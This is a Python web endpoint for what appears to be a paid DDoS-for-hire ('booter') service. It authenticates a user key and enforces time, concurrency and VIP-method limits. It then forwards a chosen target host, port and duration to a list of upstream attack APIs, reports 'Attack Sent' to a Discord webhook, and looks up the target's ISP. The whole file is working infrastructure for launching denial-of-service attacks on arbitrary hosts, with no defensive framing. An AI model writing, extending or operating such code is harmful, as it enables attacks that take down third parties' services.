import asyncio
import json
import ipaddress
import traceback
import httpx
from starlette.responses import Response
from starlette.requests import Request
from discord_webhook import DiscordEmbed, DiscordWebhook
from ..utils.db import key_check, premium_check
from ..utils.ratelimiter import ratelimiter

config, info = json.load(open("data/config.json", "r")), json.load(open("data/funnel.json", "r"))
webhook, slots = DiscordWebhook(url=config['config']['discordWebhook']), {m: [] for m in info['methods']}

async def slot_append(user, method, time_sleep):
    slots[method].append(user)
    await asyncio.sleep(time_sleep)
    slots[method].remove(user)
    return

async def send_request(url):
    try:
        async with httpx.AsyncClient() as c:
            await c.get(url)
    except:
        pass
    return

async def check_invalid(key_type, value):
    if not await key_check(key_type, value):
        return Response(json.dumps({"success": False, "error": f"Invalid {key_type}."}, indent=4), status_code=401)
    return None

async def attack(request: Request):
    try:
        with open("data/blacklist.txt") as f: blacklist = [line.rstrip('\n') for line in f.readlines()]

        user, key, host, method = (request.query_params.get(p, None) for p in ["user", "key", "host", "method"])
        port, attack_time, concurrents = (int(request.query_params.get(p, None)) for p in ["port", "time", "concurrents"])

        req_params = [user, key, host, port, attack_time, method]
        if None in req_params or '' in req_params:
            return Response(json.dumps({"success": False, "error": "Missing required query parameters."}, indent=4), status_code=400)

        for check in [await check_invalid("key", key), await check_invalid("user", user)]:
            if check: return check

        user_key_db = await key_check("user", user)
        if user_key_db and user_key_db['key'] != key:
            return Response(json.dumps({"success": False, "error": "Key not assigned to the provided user."}, indent=4), status_code=401)

        if not host.startswith('http'): ipaddress.ip_address(host)

        if method not in info['methods'] or host in blacklist or ('http' in host and info['methods'][method]['type'] == "l4"):
            return Response(json.dumps({"success": False, "error": "Invalid method or blocked host."}, indent=4), status_code=400)

        if concurrents > user_key_db['concurrents'] or concurrents > info['methods'][method]['maximumConcurrents'] or attack_time > user_key_db['time']:
            return Response(json.dumps({"success": False, "error": "Invalid concurrency or time limit."}, indent=4), status_code=400)

        if info['methods'][method]['premium'] and not await premium_check("user", user):
            return Response(json.dumps({"success": False, "error": "VIP-only method."}, indent=4), status_code=400)

        if slots[method] and len(slots[method]) >= info['methods'][method]['slots']:
            return Response(json.dumps({"success": False, "error": f"All the {info['methods'][method]['slots']} slots for this method are in use."}, indent=4), status_code=403)

        if not await ratelimiter(key):
            return Response(json.dumps({"success": False, "error": "Rate-limited."}, indent=4), status_code=429)

        asyncio.create_task(slot_append(user, method, attack_time))
        
        for url in set(info['methods'][method]['apiList']):
            asyncio.create_task(send_request(url.replace("<<$host>>", host).replace("<<$port>>", str(port)).replace("<<$time>>", str(attack_time))))

        embed = DiscordEmbed(title="Example API - Attack Sent", color="2d6bda")
        embed.add_embed_field("User", user, False)
        embed.add_embed_field("Host", host, False)
        embed.add_embed_field("Port", port, False)
        embed.add_embed_field("Time", attack_time, False)
        embed.add_embed_field("Method", method, False)
        embed.add_embed_field("Concurrents", str(concurrents), False)
        embed.set_footer("example's api ~ the best!")

        webhook.add_embed(embed)
        webhook.execute()

        response_data = {"success": True, "message": "Attack sent.",
                         "info": {"host": host, "port": port, "time": attack_time, "method": method, "concurrents": concurrents}}

        if "http" not in host:
            ip_info = httpx.get(f"http://ip-api.com/json/{host}").json()
            response_data["info"].update({"isp": ip_info['isp'], "org": ip_info['org'], "as": ip_info['as'], "timezone": ip_info['timezone']})

        return Response(json.dumps(response_data, indent=4))
    except ValueError:
        print(traceback.format_exc())
        return Response(json.dumps({"success": False, "error": "Invalid host."}, indent=4), status_code=400)
    except Exception as e:
        print(traceback.format_exc())
        return Response(json.dumps({"success": False, "error": str(e)}, indent=4), status_code=500)